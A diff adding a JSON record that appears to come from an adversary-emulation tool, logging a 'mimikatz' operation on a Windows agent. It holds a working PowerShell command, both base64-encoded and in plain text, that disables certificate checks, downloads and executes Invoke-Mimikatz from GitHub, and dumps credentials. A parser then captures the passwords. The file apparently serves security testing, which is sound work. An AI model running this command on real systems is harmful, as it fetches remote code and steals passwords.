@@ -1,0 +1,96 @@
+{
+    "name": "mimikatz",
+    "id": 1,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "last_seen": "2020-02-18 20:17:33",
+            "architecture": "amd64",
+            "platform": "windows",
+            "server": "http://192.168.1.250:8888",
+            "host_group": "my_group",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "pid": 1488,
+            "ppid": 3064,
+            "trusted": 1,
+            "last_trusted_seen": "2020-02-18 20:17:33",
+            "sleep_min": 10,
+            "sleep_max": 10,
+            "executors": [
+                {
+                    "executor": "cmd",
+                    "preferred": 1
+                },
+                {
+                    "executor": "psh",
+                    "preferred": 0
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2020-02-18 20:17:29",
+    "facts": [],
+    "finish": "2020-02-18 20:17:35",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 25,
+        "adversary_id": "442baa51-f645-45b6-8a96-e24bcfe8510e",
+        "name": "mimikatz",
+        "description": "run mimikatz",
+        "phases": {
+            "1": [
+                {
+                    "id": 107,
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "tactic": "credential-access",
+                    "technique_name": "Credential Dumping",
+                    "technique_id": "T1003",
+                    "name": "Run PowerKatz",
+                    "test": "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkVHJ1ZSB9Owokd2ViID0gKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpOwokcmVzdWx0ID0gJHdlYi5Eb3dubG9hZFN0cmluZygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC80YzdhMjAxNmZjNzkzMWNkMzcyNzNjNWQ4ZTE3YjE2ZDk1OTg2N2IzL0V4ZmlsdHJhdGlvbi9JbnZva2UtTWltaWthdHoucHMxIik7CmlleCAkcmVzdWx0OyBJbnZva2UtTWltaWthdHogLUR1bXBDcmVkcw==",
+                    "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [
+                        {
+                            "ability": 107,
+                            "name": "mimikatz",
+                            "property": "host.user.password",
+                            "script": "Password\\s:\\s(.*)"
+                        }
+                    ],
+                    "payload": [],
+                    "adversary_map_id": 110
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+            "paw": "WIN-532ILFRKI44$WIN-532ILFRKI44\\zathras",
+            "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");iex $result; Invoke-Mimikatz -DumpCreds",
+            "delegated": "2020-02-18 20:17:30.007004",
+            "run": "2020-02-18 20:17:33",
+            "status": 1,
+            "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+            "name": "Run PowerKatz",
+            "attack": {
+                "tactic": "credential-access",
+                "technique_name": "Credential Dumping",
+                "technique_id": "T1003"
+            }
+        }
+    ]
+}
